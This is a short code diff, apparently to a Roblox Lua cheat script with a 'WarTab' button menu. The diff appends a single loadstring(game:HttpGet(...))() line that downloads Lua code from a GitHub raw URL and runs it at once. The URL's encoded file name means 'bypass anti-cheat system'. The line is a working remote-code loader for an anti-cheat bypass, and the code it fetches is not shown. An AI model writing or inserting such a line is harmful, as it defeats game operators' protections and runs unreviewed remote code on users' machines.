@@ -1279,3 +1279,5 @@ WarTab:CreateButton({
         })
     end
 })
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/114514mim/kdjddjosso/refs/heads/main/%E7%BB%95%E8%BF%87%E5%8F%8D%E4%BD%9C%E5%BC%8A%E7%B3%BB%E7%BB%9F"))()
